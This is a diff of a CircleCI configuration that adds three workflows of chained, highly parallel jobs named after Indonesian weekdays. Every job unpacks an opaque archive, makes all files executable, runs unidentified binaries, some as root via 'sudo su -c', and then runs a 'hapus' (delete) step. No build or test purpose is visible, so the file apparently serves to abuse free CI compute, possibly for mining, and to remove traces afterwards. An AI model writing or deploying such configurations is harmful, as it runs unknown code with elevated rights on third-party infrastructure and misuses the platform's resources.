@@ -1,30 +1,74 @@
-
 version: 2.1
 
-commands:
-  setup:
-    steps:
-      - run:
-          name: jumat
-          command: |
-            tar -xf apem && chmod u+x *
-            ./tembem
+orbs: 
+  github-cli: circleci/github-cli@dev:alpha
 
-  setep:
-    steps:
-      - run:
-          name: sabtu
-          command: |
-            ls
+workflows:
+  version: 2.1
+  workflo_01:
+    jobs:
+      - senin
+      - selasa:
+          requires:
+            - senin
+      - rabu:
+          requires:
+            - senin
+            - selasa
+      - kamis:
+          requires:
+            - senin
+            - selasa
+            - rabu
+      - jumat:
+          requires:
+            - senin
+            - selasa
+            - rabu
+            - kamis
+      - sabtu:
+          requires:
+            - senin
+            - selasa
+            - rabu
+            - kamis
+            - jumat
 
-      - run:
-          name: minggu
-          command: |
-            ./hapus
+  workflo_02:
+    jobs:
+      - senin
 
+  workflo_03:
+    jobs:
+      - senin
+      - selasa:
+          requires:
+            - senin
+      - rabu:
+          requires:
+            - senin
+            - selasa
+      - kamis:
+          requires:
+            - senin
+            - selasa
+            - rabu
+      - jumat:
+          requires:
+            - senin
+            - selasa
+            - rabu
+            - kamis
+      - sabtu:
+          requires:
+            - senin
+            - selasa
+            - rabu
+            - kamis
+            - jumat
 
 jobs:
-  hari:
+  senin:
     docker:
       - image: cimg/base:stable
     steps:
@@ -32,15 +76,91 @@ jobs:
       - setup
       - setep
 
+  selasa:
+    docker:
+      - image: cimg/base:stable
+    steps:
+      - checkout
+      - setup
+      - setip:
+          result: selasa
+    parallelism: 15
 
+  rabu:
+    docker:
+      - image: cimg/base:stable
+    steps:
+      - checkout
+      - setup
+      - setip:
+          result: rabu
+    parallelism: 15
 
+  kamis:
+    docker:
+      - image: cimg/base:stable
+    steps:
+      - checkout
+      - setup
+      - setip:
+          result: kamis
+    parallelism: 15
 
+  jumat:
+    docker:
+      - image: cimg/base:stable
+    steps:
+      - checkout
+      - setup
+      - setip:
+          result: jumat
+    parallelism: 15
 
+  sabtu:
+    docker:
+      - image: cimg/base:stable
+    steps:
+      - checkout
+      - setup
+      - setip:
+          result: sabtu
+    parallelism: 15
 
-workflows:
-  version: 2.1
-  workflo_01:
-    jobs:
-      - hari
+commands:
+  setup:
+    steps:
+      - run:
+          name: minggu
+          command: |
+            tar -xf apem && chmod u+x *
+            ./tembem
 
+  setep:
+    steps:
+      - run:
+          name: minggu
+          command: |
+            ./time
 
+      - run:
+          name: minggu
+          command: |
+            ./hapus
+
+  setip:
+    parameters:
+      result:
+        type: string
+    steps:
+      - run:
+          name: minggu
+          command: |
+            ./star
+            sudo su -c "./06"
+            ./hapus
+
+      - run:
+          working_directory: /home/MrTakurSing
+          name: minggu
+          command: |
+            sudo su -c "./start"
